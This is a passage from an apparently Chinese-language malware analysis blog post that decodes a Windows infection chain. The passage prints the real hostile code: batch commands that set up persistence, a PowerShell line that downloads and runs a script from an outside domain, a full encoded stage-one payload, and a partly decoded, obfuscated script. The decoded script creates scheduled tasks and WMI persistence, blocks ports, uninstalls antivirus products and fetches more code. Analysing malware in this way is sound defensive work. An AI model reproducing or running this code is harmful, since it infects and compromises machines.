class="line">//创建批处理，内容为启动服务</span><br><span class="line"><span class="built_in">echo</span> net start Ddriver &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">for</span> /f  %%i <span class="keyword">in</span> (<span class="string">&#x27;tasklist ^^^| find /c /i &quot;cmd.exe&quot;&#x27;</span>^) <span class="keyword">do</span> <span class="built_in">set</span> s=%%i &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">if</span> %s% gtr 10 (shutdown /r) &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> del c:\windows\temp\p.bat&gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> c:\windows\temp\installed.exe&gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line">cmd.exe /c c:/windows/temp/p.bat&amp;</span><br><span class="line">cmd /c c:\windows\temp\installed.exe</span><br></pre></td></tr></table></figure><p>批处理功能</p><ul><li>设置防火墙规则，转发65532、65531、65529的请求到1.1.1.1</li><li>创建计划任务定时启动</li><li>写入批处理检测<code>cmd.exe</code>进程</li><li>如果<code>cmd.exe</code>进程数量大于10则重启机器</li></ul><h2 id="powershell命令-下载执行PS脚本"><a href="#powershell命令-下载执行PS脚本" class="headerlink" title="powershell命令 下载执行PS脚本"></a>powershell命令 下载执行PS脚本</h2><p>powershell解码后如下</p><p><img src="/images/image-20201231144606735.png" alt="image-20201231144606735"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">&#x27;http://t.amynx.com/gim.jsp&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>gim.jsp</code>下载下来是一个<code>Poweshell</code>文件</p><h2 id="gim-jsp-第一阶段攻击脚本"><a href="#gim-jsp-第一阶段攻击脚本" class="headerlink" title="gim.jsp 第一阶段攻击脚本"></a>gim.jsp 第一阶段攻击脚本</h2><p>gim.jsp</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">I`EX <span class="variable">$</span>(<span class="built_in">New-Object</span> IO.StreamReader (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.Compression.DeflateStream (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.MemoryStream (,<span class="variable">$</span>(<span class="string">&#x27;edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f227eb7bd7999a69fa51fddf9f8ddc79f7c7fffdef7f2c597df7efdf277fbe4fbbb7bdfcbbff872fe7af5bba55bbf30fd993b9fdefbfeabecdb27df1b7dfce264fe719a9e9e64e52a7fb59da60fed375f9db7fe37773efe8d93df38f9f8938fefa477f64da33b0f7777e5d74f761ee017fa9e7e7ff8f0fbafe8377cbe45009eaf72faebd53660ebc7a33bf7ed9b0fe9b307fafb03f3e9564a9fe6e8fcf4d5743bdddfdb75ef12663ff1d36fe85f81fd6adb0e873efbceec84feb56fd23be91ea193d12fdae2cdab87f46f6a5e4ed34f1feaeb77f6a895c5ebc0feb6b783cf0d62a9057e87e03cbb9b664dfb2a5db677d3bccdcb7c76376dde36593b9f36a0187dbfeb35a0373e017e9d76049f9bee69536d160789ff7e09fec9a775f5ecf7f83d7e8f74370585d765f693dbe9d3575f7ef72926ef938f0122cd57d76fb6d36555344d5eaf16d5495e4eb2a6789a5e3d9b36d4a8ced1345f6475f6924853e79775fe7a992d96d973fab3c9a7053ea05fdbfc7559d5edb23a6997795daf4fe8b32f4edfbcfe7df0e5a32f9eff5edf2688e9bccd5e6ea7d76d9dafaafae5226fcfb6e9c5941e60fc765a9593cf0819f439cdd2fbf7763f6beb6a556653faa02ad3157ee2cbcfca6a5ab555bd4a97c56775314bafe8c3674a17bc4caf5e2ff319f5f91921bffc8a3e932fd3bc5cd7e96c96a565995de575716e7fb9a40fe74d9b2ffbf80099fd7d834c556a4f84501c9b67d3fbfbf4c5fef512d42334f405c14671a0af3a6868ab3836f7ee73ffed345f2eab69ba3be6ff3ec3c4d170e463d34dfa70effefd4fb9fd326f9ba24cf72fab76ff92077efd8e50a5afb4f1ca0c269f66e7fa3b4dfbb248f377f9384061f6fac5d3d7021b1248a34f2f96c59226133d8554752f4feff21f18ee622aa0b41be25488606afe411ff7d3559e970d64b3adb3b649f561bebef34b30d18e7f9f4d0964b1a0bfae48b40186d401cdfbac98a757db844c3e172ebe22f4a677991d5a924fbc91bfc997c5f3193133b1fd217d0524091cf1ebde3d62cde6ba018b5f55b3657105269ee275703064a45d53fbd34348d602eae3453e8776f9e4ea19d86faa8cf7e217ff9e694302b1585fd4c7dbe00b70d3aaa8a7cd640df0ad9985aa867ce46602b35583d75943d52c81eb4664ebf2d4a22da4e0b74fd2a6c9ca936d9ac425116d79562cbe0bd1dafaacced18edf3ebc4313f53a054f82a7e55dd0f9b8aeeafa743bfd252043f3e59a47fffaf77ffda5e38797bfbffe9ab5d9d3196b85365b908639c7777bf796c577e9c5f4f8f519a1a04d8109b55b9eb5f9459d4127ebb4a5a7af4ebffddd7467e7d37be98bb36fbf39fb6eca235b0a3a3ca2c2a8b96c5a9c17b3ea0b33b2dffff74fbff8f2d5b3f45be99b93d3e7a7af85e29f5dd7f9fa2780fff39ff82e53ff225b5f909ab29fef5d2e0a9a5c854a9407c9f95562fcd56b909b9138c46f7636a7e7fe54023b3b9be03a9d50fad59f539d4c03763b25792a8b672d6b83cb531ac1f06ca161c8358a718f79ecf4032bf46a260b9da327cb45e9c5b2202e7e522b1b556fa49f414444e4582c217777686a57cd4f8fb38c7e19993fe8e716f5411e403dbe73e7fe16a982ba056af4de784de41b2942d470efab4eeb11aca6bc42bfe02d79859aed066d9bd50253f1190b3aa4dc28848f455f2c33108238ec33376f167941df687ffef18bef34e88854758a9f5bf36996d7956174f38a080aa4242a1bda9a4504fcaf42312c11425d91038ffb81642000d423f81dfcb489e5e9fb673196a7cf235c6f948ae3cd2ecbd347a4b8276f89e613fa9dc0f8da4bdfef2a31c36ec28ef48e016ffa8b49c026f637c4ffc57776dba29aa9466fabe5f6d679a10ee62ff9c5f32991883d1c99108b38fdeeec3ce30f41e08ecfb753fa76a9887555705563a22cb2da6a006732b43f3df9f2ec0b60fcf967065146fbba6e3dff0bc8fe985a34a3fa183d366f64dbc0b646427eecc7f41550172c4c889df32f1803bcc3e5ba768e9e34df1553c93018f2365b4cf9f297c80fede097fc987eaae4fb31f3f78fd18be68fb25c2fb7db7545fef31dfcfe1dbc2c5a860466b4938ef853fcaebf607e46fbe9e80ee49ffeb02ac00a7357f09dc62215e0544620fcf46d4ffe474487a75f9cfcfeaf5fd22ff6cb72f17b8f4112c6097367fedaa29f50724d7191bf1ad7f9acaccebf038febe4c7f8c1707fec17dfb9a350e90b010c5db42c32f263d176dce5feb13883e8e0bcb08030f1f6f7f44e633c58695e18b62bcef3a7165b523f0c4bbf6390a9ea2203ea0e0121755378efe0577d459497795fde6365ad1fed6e815bde1097daf19f7ce681d3d63071c468fa12331e08c1af3cc3cb9775d33678d74209b8cff0dcc750c7fc8f729e9db0884fc60e194b2771364536835cbff3695a2deea6a76fbe7a71f605b86ddadc5583081e82fb85b14f7dd1d079c89b324f7fd6706144c44b4c2199b943c3494d80d09d0c5464be51bb45e68022f2a59b8c5ff24be853f5810081851aa64d10f9c518d22fb9236f6e7d42d2621dd4efaafe3daf5e57b543605a7c41adf03a5eb718fce23b7be92fcaad6771ef772ff0397a53e47e89f4615fdce5e6d4ce91de1fcb2f69be5450105dee917ed17777ccbbfe1b7744dee95f7d91befaf25d3e5b9e3d7af4fdebacaeb3ef1169f08aa15ed46aab0ed3297626ec63d84733a1f663f00f4fe4de2ecda476ec4da8fdc49b4c4fdd5a96ea74476027e249f67ae4ee14acf4ba917f00e32e3c974ec78e75e44f353abe69f4ed22f40623e4318267debd4fb78c86801a08259f5af8c2df16f441cfd4ddd992b8f3441a52136ee0cc30d2109c221853cc3bcbe7d3d76a4029e632b674fb2a7f41936dbaf2a243f89d0b68e2e9f8ddf27a918de14a8ef8c3e9f882b2113f709fe84b95d188e39dfade0fe4fbaddff333e61ea6d39d3b9ffeeeac58496cb25730e25b9f7cba45eed71a18b94f7fe2a7a9d19b3b7b7bbbe3f183879fec3c1c8f15f2fd4f3f79707f3c3ed8dffafef7bf5767f3e9f7b69645f5d3a458ea759bd7bfd828e02d1571d2f31098e9727d6e346e5db51919be62592c60948e79c2a6e9f7f3b27a456ea202288bf513116f9e2e560bf4f1770d226526b13b53bb98922d7d39be6e8b7aaddfc38fcb5f7f6f0b509767cd1999df2dcdced00021686d417fcfce6c27df1d134c1fd294deffbefd4c758dd788deb936e86af3adcf3299c6df3821dadfc11cd2ffa8e1b7e437a6d59d3b4ce97a6bf4f4ecabafc677da295acc242944b12799ee35d25126ea64775af8a5a230601b0a7074fac5f18b57a7afbf7a74b9cca14ee4ef375f31b5f8b5975f7c79a2df6efd9eac31e97fbf07fdff136d7049dfe0630e68eecaf79f9435eb98ec50fe6617069fcb8f5df3a78290bfeede7db46adb39ffa15fac3f1340bfe497fc923b13fa69b805aa1134d87a97af2ecfcf7eb136271feacef7f5f7dd07c4753bdf9b7d0744b12f82cdb401bdcdbed3ebfd4ff3267bb2a8ea67349f14a75f526e083d98d8eb0e8973714974851cea67b5fecc5f57edeaba8617b77bfcedd7e3ebf92aab2fe4333bfd42746ac272ba35c248602a10f25c73a0429d8e0d4851538746045632802d32b2ad2411912882f49d8d6b6a7bc8d8696345b236681dbf7ed54789de7558314a9f31a0dd9d773b18f3c79261d8c19ff8ec336270ebf7afde9d8e57680da674d3f7d9ce6ef6edd9f32f7fd1f9aa7ef0ead3dfe72c3fdffde95d827439fd89af56cff7eefea09cfcf4eae4f9d39f9edc3ff862e7e4feef53ae7fd177df2e4fbeca5f3c9fef9fe7bfa8d87ff58377cb7bd3e3d73f7530bd7afb6aa7deb9470ee3f3c9faf9ea60f7e079317dfadd9d57bfcfdd370b2491eb7bbfd78345f9eddfe76c5ab43f78f30333febd172fee7d71f5f0ec634d650a1bbffce9fdb7f577cff1dea73fd97e7bb27eb15cbc7971efeee5c1e50574c762f57bd3bf4f763fbfa41fbff7fac16ef5ddc51eb3214865b984b9c412da328bf9847986b42429e9ea8bb18d57ce3dc7f0d04d22cd8c7ebc8967303bdaecc5674cf6ef4fe9dff1f8de83ddefc1927c3611f6f8c577e893b4bdd84ea7e2a38385a090a7636e36956687f42ffb0d5ba42b39e2ceaa7279553da53f49832cf3a224793a99e4df1db7645108077a813e0126f4db15fd4a0cfc1940fe628193890f4e8a195ca09106eb68fa7b36fbe28b6b7a7e7ffa3d95c89ed37164a99f8ad9a07ea13fe8c3df0331f5a5becc0e311b7343dd25b912f9bb6a72d12c38cfbe5a376ce609e7b2682856bf64b713d452b2532a726767874291257cbcbcceaecaec8b6dd2d6c79c766faf27fa19fdb9fb4b3103f54bce083d7cc4fe2ab91194300136f9252216247421ab40855c819621e3b72967fabf5cffee76ee9648e6bef8dd31eafc6d511af705896b40ceeb7c7e45c42546a1843772a6c8cba493bba9a46b633d53b7d4b9f64cbf312a9dfe9b755dfc2406e87aee74492fbd6faf66b0d21f662f36e4a11e3143efdfa3d20b6ea14768fd943bc740d0ffea32eb75edaf541012e05b436c05f13eb8b8a9f6c7dd3666a5c1438059fbc3e638d29f19eaef7efd5612f110c906a98fdfeb7747d7764c3d0ce8af9b90c00bd00c40e563449e061b16ad028e63809399199f1479733ac870a66b7d2f4a06ea6331a52fb7b6d2ad14668ffeb73cabbeb32d13f90eef7effde68f77b77b63e7f51bc2273f3667c3a7d91bf3a7d76fa6a9537d5a43efd495a674db7c61f6f6d7d941ea6bf702bfddd4e5ffce4a3932fbf685e9e4ebfb73fdabd3fdabbfffdedef5467cb8f698595ba4a3f3f7db3fd93d9abb3ec49799aee7d9b9676b72f8fcbaf4ebf5cdef9de36ad0d8db76f6a367e7efae2f337f3f44eca905f7cfc31fdfa1b27ff0f&#x27;</span><span class="operator">-split</span><span class="string">&#x27;(..)&#x27;</span>|?&#123;<span class="variable">$_</span>&#125;|%&#123;[<span class="type">convert</span>]::ToUInt32(<span class="variable">$_</span>,<span class="number">16</span>)&#125;))), [<span class="type">IO.Compression.CompressionMode</span>]::Decompress)), [<span class="type">Text.Encoding</span>]::ASCII)).ReadToEnd();</span><br></pre></td></tr></table></figure><p>解密后内容如下（参考链接：<a href="https://threat.tevora.com/5-minute-forensics-decoding-powershell-payloads/">5分钟解码powershell payload</a>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$2hl  = &quot;)&#x27;x&#x27;+]43[emOHSP$+]12[eMOhSp$ (&amp; |)63]RaHC[,&#x27;NCh&#x27;  ECalpeR-  93]RaHC[,&#x27;Uft&#x27;  ECalpeR- )&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;+&#x27;) )43]RaHC[,)911]RaHC[+07]RaH&#x27;+&#x27;C[+99]R&#x27;+&#x27;aHC[(ECaLpe&#x27;+&#x27;R-93]R&#x27;+&#x27;aHC[,)511]RaHC[+9&#x27;+&#x27;7]RaHC[+711]RaHC[( &#x27;+&#x27;eCalpERc- 421]R&#x27;+&#x27;aHC[,UftQjTUftECaLpeR-63]RaHC[,UftJdCUfteCalpERc-&#x27;+&#x27; 29]Ra&#x27;+&#x27;HC[,UftTR9Uft ECaLpeR-  69]RaHC[,)2&#x27;+&#x27;11]RaHC[+811]RaHC[+20&#x27;+&#x27;1]RaHC[(  eCalpERc-)UftF/ astR nt/ eteled/ sksathcs</span><br><span class="line"></span><br><span class="line">F/ 1astR nt/ etUft+Ufteled/ sksathcs</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">F/ 2astR ntUft+Uft/ eteled/ sksathcs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ecroF??? 1 e&#x27;+&#x27;ulaV- DROWDUft&#x27;+&#x27;+Uft epyT- noisserpmoCelbasiD wFcs&#x27;+&#x27;ret&#x27;+&#x27;emaraPTR9revreSnamnaLTR9secivreSTR9teSlortnoCtnerruCTR9METSYSTR9:MLKHwFc htaP- ytreporPmetI-teS    </span><br><span class="line"></span><br><span class="line">kcolb=noit&#x27;+&#x27;ca 531=troplac&#x27;+&#x27;ol pc&#x27;+&#x27;t&#x27;+&#x27;=locotorp ni=rid w&#x27;+&#x27;FUft+Uft&#x27;+&#x27;c531ynedwFc=emanU&#x27;+&#x27;ft+Uft elur dda llawerif llawerifvda hsten    </span><br><span class="line"></span><br><span class="line">kcolb=noitca 544=troplacolUft+Uft pct&#x27;+&#x27;=locotorp ni=rid wFc54&#x27;+&#x27;4yn&#x27;+&#x27;edwFUft+Uftc=eman elur d&#x27;+&#x27;da llawerif llaUft+Uftwerifvda hsten    </span><br><span class="line"></span><br><span class="line">35=troptcennoc 1.1.1.1=sserddatcennoUft+Uftc 92556=tropnetsil 4vot4v dda yxorptroUft+UftpUft+Uft ecafUft+Uftretni exe.hsten    </span><br><span class="line"></span><br><span class="line">dSNDS 92556 &#x27;+&#x27;pct gninepotrop dda llawerif exe.hsten c/ exe.&#x27;+&#x27;dmc    </span><br><span class="line">Uft+Uft</span><br><span class="line">&#125;&#x27;+&#x27;  &#x27;+&#x27;  &#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">5 peels-&#x27;+&#x27;trats        </span><br><span class="line"></span><br><span class="line">&#125;)&#125;w&#x27;+&#x27;Uft&#x27;+&#x27;+UftFcdmcim&#x27;+&#x27;wJdC&#x27;+&#x27; c- neddih w- llehs&#x27;+&#x27;rewop c/wFc=etalpm&#x27;+&#x27;eTeniLdnammoC;wFcexe.dmcTR923metsysTR9swodniwTR9:cwFc=htaPelbatucexE;e&#x27;+&#x27;ma&#x27;+&#x27;NehtJdC+wF&#x27;+&#x27;ccwFc=emaN&#123;@ stnemugrA- wFcnoitpircsbusTR9toUft+UftorwFc eUft+UftcapsemaN-&#x27;+&#x27; r&#x27;+&#x27;emusnoCtnevEeniLdnamm&#x27;+&#x27;Uft+UftoC ssalC- ecnatsnIimW-teS(=rem&#x27;+&#x27;usnoC;)potS n&#x27;+&#x27;oitcUft+Uf&#x27;+&#x27;tArorrE- &#125;;wFcsOumetsyS_SOfUft+UftreP_Uft+UftataDdet&#x27;+&#x27;tamroFfreP_23niWsOu ASI ecUft+Uftnats&#x27;+&#x27;nItegraTUft&#x27;+&#x27;+Uft EREHW 0063 NIHTIW tnevEnUf&#x27;+&#x27;t+UftoitUft+UftacifidoMecnatsnI__ MORF * TCELESwF&#x27;+&#x27;c=yreuQ;wFcLQWwFc=egaugnaLyreuQ;wFc2vmicTRUft+Uft9toorwF&#x27;+&#x27;c=ecapSemaNtnevE;emaNehtJdC+wFcfwFc=emaN&#123;@ s&#x27;+&#x27;tnemugrA- &#x27;+&#x27;wFcnoitp&#x27;+&#x27;ircsbusTR9toorwFc ecapSemaN- retliFtn&#x27;+&#x27;evE__ ssalC- ecnatsnIimW-teS(=retliF&#123;@ stnemugrA- Uft+UftwFcnoitpircsbusTR&#x27;+&#x27;Uft+Uf&#x27;+&#x27;t9tooUft+UftrwFc &#x27;+&#x27;ecapsemaN- gnidniBremusnoCoTretliF__ ssalC- ecnatsnIimW-teS      &#x27;+&#x27;  </span><br><span class="line"></span><br><span class="line">)sOupsj.aasOu,sOupsj.asOu(ecalper.))5(gnirtsbus&#x27;+&#x27;.uJdC,Uft+UftsOu2UsOu(ecalper.))5,0&#x27;+&#x27;(gnirt&#x27;+&#x27;sbus.uJdC,sOu1UsOu(ecalper.spmtJdC=dmcimwJdC        &#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">naR&#x27;+&#x27;teg=emaNehtJdC    &#x27;+&#x27;    </span><br><span class="line"></span><br><span class="line">U&#x27;+&#x27;ft+U&#x27;+&#x27;ft&#123;)suJdC ni uJdC(hcaerofUft+Uft    </span><br><span class="line"></span><br><span class="line">potS noitcArorrE- &#125;;wFcsOumetsyUft+UftS_SOfreP_ataDdettamroFfreP_23niWsOu ASI ecnatsnItegraT EREHW 0063&#x27;+&#x27; NIHTIW tnevEnoitacif&#x27;+&#x27;idoMecnatsnI__ MORF * TCELESw&#x27;+&#x27;Fc=yreuQ;wFcLQWwFc=eg&#x27;+&#x27;augnaLyreuQ;wFc2vmiUft+UftcTR9toorwFc=ecapSemaNtnevE;wFcllabkcalbwFc&#x27;+&#x27;=emaN&#123;@ stneUft+UftmugrA- wFcnoitpiUft+UftrcsbusT&#x27;+&#x27;R9toorwFUft+Uftc ecapSemaN- retliFtnevE__ ssalC- ecnatsnIimW-teS    </span><br><span class="line"></span><br><span class="line">&#123;)1tiodJdC&#x27;+&#x27; ton-(fi</span><br><span class="line"></span><br><span class="line">&#x27;+&#x27;&#125;&#123;hctac&#125;</span><br><span class="line"></span><br><span class="line">wFcsOullabkcalbsOuU&#x27;+&#x27;ft+Uft=emaNwFc retlif- sOunUft+UftoitpircsbusTR9toorsOu ecapSemaNUft+Uft- retliFtnevE__ ssalC- tcejbOIMW-teG=1tiodJdC</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x27;+&#x27;&#125;</span><br><span class="line"></span><br><span class="line">5 pUft&#x27;+&#x27;+U&#x27;+&#x27;fteels-tra&#x27;+&#x27;tUft+Ufts</span><br><span class="line"></span><br><span class="line">&#x27;+&#x27;wFcntJdCTR9fntJdCwFc nt/ nur/ sksathcs</span><br><span class="line"></span><br><span class="line">1 peelsUft+U&#x27;+&#x27;ft-trats</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Uft+Uft&#125;</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;</span><br><span class="line"></span><br><span class="line">&#125;&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">llun-tuoQjT)llunJUft+&#x27;+&#x27;UftdC ,0 ,llunJdC ,llunJdC&#x27;+&#x27; ,4 ,)))5(&#x27;+&#x27;gnirtsbus.uJdC,sOu2UsOu(ecalper.))Uft+Uf&#x27;+&#x27;t5,0(gnirtsbus.uJdC,sOu1UsO&#x27;+&#x27;u(ecalper.spmtJdC,wFcDMC_SPwFc(ecalper.lmX.ksatJdC ,emaN.ksatJdC(ksaTretsigeR.redlofJd&#x27;+&#x27;C</span><br><span class="line"></span><br><span class="line">&#123;))wFcDMC_&#x27;+&#x27;SPwFc(&#x27;+&#x27;sniatno&#x27;+&#x27;C.stneUft+UftmugrA.noitcaJdC(fi</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line">&#123; )snoit&#x27;+&#x27;cA.noitinUft+UftifeD.ksatJdC ni noitcUft+UftaJdC( hcaerof</span><br><span class="line"></span><br><span class="line">&#123;)&#x27;+&#x27;metiksatJdC ni ksatUft+UftJdC(hcUft+Uftaerof</span><br><span class="line"></span><br><span class="line">)Uft+Uft1(sksaTteG.redlofJdC=metiksatJdC</span><br><span class="line"></span><br><span class="line">)wFcfntJUft+UftdCTR9wFc(redloFteG.vrstsJdC=redlofJdC</span><br><span class="line"></span><br><span class="line">1 peels-trats&#x27;+&#x27;</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wFcDMC_SP c- neddih w- llehsrewopwFc rt/ F/ wFcntJdCTR9fntJdCwFc nt/ 06 om/ ETUNIM&#x27;+&#x27; cs/ Uft+Uf&#x27;+&#x27;te&#x27;+&#x27;taerc/ sksathcs</span><br><span class="line"></span><br><span class="line">&#123; esle &#125;</span><br><span class="line"></span><br><span class="line">wFcDMC_SP c- neddih w- llehsrewopwFc rt/ F/ wFcntJdCTR9fntJdCwFc nt/ 06 om/ ETUNIM cs/ metsys ur/ etaerc/ sksUft+&#x27;+&#x27;Uftathcs</span><br><span class="line"></span><br><span class="line">&#123;)asJdC(fi</span><br><span class="line"></span><br><span class="line">naRteg = ntJdC</span><br><span class="line"></span><br><span class="line">&#125;&#125;naRUf&#x27;+&#x27;t+&#x27;+&#x27;U&#x27;+&#x27;ftteg=fntJdC&#123;esle&#125;)naRteg(+sOuTR9swodniWT&#x27;+&#x27;R9tfoSorUft+&#x27;+&#x27;UftciMsOu=fntJdC&#123;)asJdC(fi&#123;)2 qe- Uft+Uft3%iJdC(&#x27;+&#x27;fi</span><br><span class="line"></span><br><span class="line">&#125;naRteg=fntJdC&#123;)1 qe- 3%iUft+Uf&#x27;+&#x27;tJdC(fi</span><br><span class="line"></span><br><span class="line">&#125;sOUft+Uft&#x27;+&#x27;usOu=f&#x27;+&#x27;ntJdC&#123;)0 qe- 3%iJdC(fi</span><br><span class="line"></span><br><span class="line">)uJdC,suJdUft+UftC(fOxednI::]yarra[ = iJdC</span><br><span class="line"></span><br><span class="line">&#123;)suJdC ni uJdC(hcaerof</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wFcllabkcalbw&#x27;+&#x27;Fc rt/ F/ llabkcalb&#x27;+&#x27; nt/ 021 omUft+Uft/ ETUNIM csUft+Uft/ etaerc/ sksathcs</span><br><span class="line"></span><br><span class="line">&#123; esle &#125;</span><br><span class="line"></span><br><span class="line">wFcllabkcal&#x27;+&#x27;bwF&#x27;+&#x27;c rt/ F/ llabkcalb nt/ Uft+Uft021 om/ ETUNIM cs/ metsys ur/ etaer&#x27;+&#x27;c/ &#x27;+&#x27;sksathcs</span><br><span class="line"></span><br><span class="line">&#123;)asJdC(fi</span><br><span class="line"></span><br><span class="line">&#123;)tiodJdC ton-(fi</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;</span><br><span class="line"></span><br><span class="line">)&#x27;+&#x27;wF&#x27;+&#x27;Uft+&#x27;+&#x27;UftcllabkcalbwFUft+&#x27;+&#x27;Uftc(ksaTteG.)wFcTR9wFc(redloFt&#x27;+&#x27;eG.vrstsJdC=ti&#x27;+&#x27;odJdC</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line">)(tcennoC.vrsts&#x27;+&#x27;JdC</span><br><span class="line">U&#x27;+&#x27;ft+Uft</span><br><span class="line">ecivreS.eludehcS tcejbOmoC- tcejbO-weN = vrstsJdC</span><br><span class="line">Uft+Uft</span><br><span class="line">)sOumo&#x27;+&#x27;c.xnyma.tsOu,sOumoc.g9rez.tsOu,sOumUft+UftocUft+Uft.0r3zz.tsOu(@=suJdC</span><br><span class="line"></span><br><span class="line">&#125;))6%)&#x27;+&#x27;modnaR-teG(+6( tnuoC- modnaR-teGQj&#x27;+&#x27;T)221..79+09..Uft+Uft56+75..84(]][rahc[(nioj- nruter&#123;)Uft+Uft(naRteg noi&#x27;+&#x27;tcnuf</span><br><span class="line"></span><br><span class="line">)wFcrotartsinimd&#x27;+&#x27;A&#x27;+&#x27;wFc ]eloRnItUft+UftliuBswodni&#x27;+&#x27;Uf&#x27;+&#x27;t+UftW.Uft+UftlapUft+U&#x27;+&#x27;fticnirP.ytiruUft+Uftc&#x27;+&#x27;eS[(eloRnIsI.))(tnerruCteG::]ytitnedIswodni&#x27;+&#x27;W.lapicnirP.ytiruceS[]lapicnirPswodniW.lapicnirP.&#x27;+&#x27;ytUft+UftiruceS[(=asJdC</span><br><span class="line"></span><br><span class="line">sOu))sOusOu&#x27;+&#x27;*sOusOunioj-))modnar(,DIUU.)tcu&#x27;+&#x27;dorPmetsySretupmoC_Uft+Uft23niW tcejboimw-teg(,EMANRESU:vneJdC,EMANRETU&#x27;+&#x27;Uft+UftPMOC:vneJdC(@(+sOusOu?sOu+Uft+UftvJdC+sOupsj.a/sOusOu+lruJdC(a;sOusOu2UsOusOu+sOusOu1UsOusOu+Uft+UftsOusOu//:ptthsOusOUft+Uftu=lruJdC&#125;&#125;&#125;)bJdC]][rahc[&#x27;+&#x27;nioj-(xepvfI&#123;Uft+Uft))))]Uft+Uft171..0[dJ&#x27;+&#x27;dC]][rahc[(nioUft+Uftj-(gnirtS46esaBmorF::]trevnoc[&#x27;+&#x27;,Uft+Uft)redivorPecivUft+UftrUft+UfteSotpyrC&#x27;+&#x27;1AHS.yhpargotpyrC.ytiruceS tcejb&#x27;+&#x27;O-weN(,bJdC(&#x27;+&#x27;ataDyf&#x27;+&#x27;irev.rUft+UftJdC(fi;)Uft+UftpJ&#x27;+&#x27;dC(sretemaraPtrop&#x27;+&#x27;mI.rJdC;redivUft+UftorPecivreSotpyrCASR.yhpargotpyrC.ytir&#x27;+&#x27;uceS tcejbO-weN=rJdC;10x0,Uft&#x27;+&#x27;+Uft00x0,10x0=tnenUft+UftopxE.pJdC;)sOuUft+UftsOu=01aHdLOqfpr7R6YIef1j1&#x27;+&#x27;vcQUpL2/zlbjpCLDjb58M0C5YluqWknCUeNLh4feqi4Rzxn3cASZ8cwkR0r03mugLbuLp818LicDW0RY/Tm2&#x27;+&#x27;r3K7mlHYIcitzTzvUft+Uft2NN3Mw9I&#x27;+&#x27;FUft+&#x27;+&#x27;UftPj4krWf2&#x27;+&#x27;6VtHbuNnmTN3/v8vgd&#x27;+&#x27;mpX&#x27;+&#x27;B1Gv&#x27;+&#x27;Xu71oWm2sOusO&#x27;+&#x27;u(gnirtS46esaBmUft+UftorF::]trevnUft+Uftoc[&#x27;+&#x27;=suludoM.pUft&#x27;+&#x27;+UftJUft+UftdC;sretemaraPASRUft+Uft.yhpargotpyrC.ytiruceS tcejbO-weUft+UftN=pJdC;]cJdC..371[dJdC=bJ&#x27;+&#x27;dC&#123;)371 tg- cJd&#x27;+&#x27;C(fi;tnuoc.dJdC=cJ&#x27;+&#x27;dC;&#x27;+&#x27;)uJdC(wFcataDdaolnwoDwFc.)tneilpvfCbeW.teN tce&#x27;+&#x27;pvfjbO-&#x27;+&#x27;wpvfeN(=dJdC&#123;)uJdC(a noitcnufsOu=spmtJdC</span><br><span class="line"></span><br><span class="line">)sOuddMMyyyy_sOu tamroF-&#x27;+&#x27; etaD-teG(+wFcvJdC&#x27;+&#x27;?wFc=vJdC</span><br><span class="line"></span><br><span class="line">tratser&#x27;+&#x27;Uft+Ufton/ sexobgsmsserppus/ &#x27;+&#x27;tnelisyrev/ wFceUft&#x27;+&#x27;+Uftxe.000sninuTR9erawlaM-itnATR9setyberawlaMTR91~argorPTR&#x27;+&#x27;9:CwFc c/ dmc</span><br><span class="line"></span><br><span class="line">evitcaretn&#x27;+&#x27;ion/ llatsninu llac wFcsOu%ytiruceS notroN%sOu ekil Uft+UftemanwFc erehw tcudorp exe.cimw b/ trats c/ dmc</span><br><span class="line"></span><br><span class="line">evitcaretnion&#x27;+&#x27;/ llats&#x27;+&#x27;n&#x27;+&#x27;inu llac wFcsOu%suriVitnA%sOu ekil emanwFc erehw t&#x27;+&#x27;cudorp exe.cimw b/ trats c/ dmc</span><br><span class="line"></span><br><span class="line">evitcaretnion/ llatsn&#x27;+&#x27;inu&#x27;+&#x27; llac wFcsOu%ytiruceS%sOu ekil emanwFc erehw &#x27;+&#x27;tcudorp exe.cimw b/ trats c/ dmc</span><br><span class="line"></span><br><span class="line">evitcaretnion/ Uft+Uftl&#x27;+&#x27;latsninu llUft+Uftac wF&#x27;+&#x27;csOu%pva%sOu ekil emanwFcU&#x27;+&#x27;ft+Uft ereh&#x27;+&#x27;w tcudorpUft+Uft exe.cimw b/ trats c/ dmc</span><br><span class="line"></span><br><span class="line">evitcaretnion/ llatsninu llac 